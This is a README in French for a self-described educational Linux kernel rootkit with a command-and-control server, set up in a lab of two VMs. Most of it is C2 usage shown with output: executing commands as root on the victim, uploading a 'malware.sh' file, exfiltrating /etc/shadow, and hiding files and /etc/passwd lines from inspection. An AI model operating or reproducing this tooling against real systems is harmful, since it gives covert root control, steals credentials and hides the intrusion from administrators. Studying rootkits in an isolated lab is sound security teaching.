# WLKOM — Wild Linux Kernel Object Module

## Description
Linux Rootkit Pédagogique en kernel module + C2 programme attaquant.

## Build

### Rootkit
```bash
./setup_vms.sh
```

Le script :

- Crée/configure les 2 VMs (Attacker + Victim)
- Compile le rootkit et le programme C2
- Déploie automatiquement tout
- Lance le rootkit sur la VM victime
- Affiche les instructions finales


Veuillez patienter jusqu'à la fin, puis suivre scrupuleusement les instructions données par le script.


## Comment rootkit-er

### Compilation

```
cd attacking_program/
make clean
make
# Résultat : wlkom_c2 (∼ 100KB)*
```

##### Démarrage du serveur

```
./wlkom_c2 4444
# Écoute sur 0.0.0.0:4444
```

##### Output attendu :

```
[*] WLKOM C2 Server listening on 0.0.0.0:4444
[*] Waiting for rootkit connection...
[+] Rootkit connected from 192.168.100.20:xxxxx
[+] Rootkit authenticated
WLKOM C2 > 
```

### Commandes

Une fois authentifié au serveur C2 :

#### Exécution de commandes

```
WLKOM C2 > exec whoami
root

WLKOM C2 > exec id
uid=0(root) gid=0(root) groups=0(root)

WLKOM C2 > exec "cat /etc/passwd | head -3"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

##### Ping/Pong (test de connexion)

```
WLKOM C2 > ping
[+] PONG received
```

##### Upload de fichiers

```
WLKOM C2 > upload /tmp/malware.sh ./malware.sh
[+] File uploaded to /tmp/malware.sh
```

##### Download de fichiers

```
WLKOM C2 > download /etc/shadow
[+] Downloaded 1234 bytes
Saved as shadow.bin
```

#### Gestion de la dissimulation
##### Masquer un fichier

```
WLKOM C2 > hide_file backdoor.sh
[+] File 'backdoor.sh' hidden from ls
```

##### Afficher un fichier

```
WLKOM C2 > unhide_file backdoor.sh
[+] File 'backdoor.sh' unhidden
```

##### Masquer une ligne dans un fichier

```
WLKOM C2 > hide_line /etc/passwd "wlkom"
[+] Lines containing 'wlkom' hidden from reads
```

##### Afficher une ligne

```
WLKOM C2 > unhide_line /etc/passwd "wlkom"
[+] Lines containing 'wlkom' unhidden
```
